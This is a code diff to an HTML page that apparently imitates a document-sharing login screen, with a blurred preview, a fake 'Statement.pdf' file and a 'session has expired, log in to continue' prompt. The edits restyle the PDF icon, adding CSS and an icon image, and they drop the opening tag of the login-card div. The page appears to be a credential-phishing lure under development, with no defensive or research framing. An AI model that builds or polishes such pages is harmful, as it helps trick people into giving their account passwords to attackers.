@@ -182,6 +182,27 @@
                 border-radius: 4px;
             }
             .doc-title { font-size: 16px; }
+            
+            
+             
+            .doc-icon {
+    width: 50px;       /* adjust width */
+    height: 50px;      /* adjust height */
+    border-radius: 8px;
+    background: #B80000; /* fallback color if image doesn't load */
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 8px;
+    overflow: hidden;  /* ensures image stays inside */
+}
+
+.doc-icon-img {
+    max-width: 80%;    /* image fits nicely inside icon */
+    max-height: 80%;
+    object-fit: contain;
+}
+
         }
     </style>
 </head>
@@ -191,10 +212,10 @@
         <img src="assets/background.png" alt="Document preview">
     </div>
 
-    <div class="login-card">
-        <div class="doc-icon">
-            <span class="doc-icon-pdf">PDF</span>
-        </div>
+    <div class="doc-icon">
+    <!-- Replace span with an image -->
+    <img src="assets/PDtrans.png" alt="PDF Icon" class="doc-icon-img">
+</div>
 
         <h2 class="doc-title">Statement.pdf <span class="doc-size">(197 KB)</span></h2>
         <p class="doc-subtitle">Previous session has expired, log in to continue.</p>
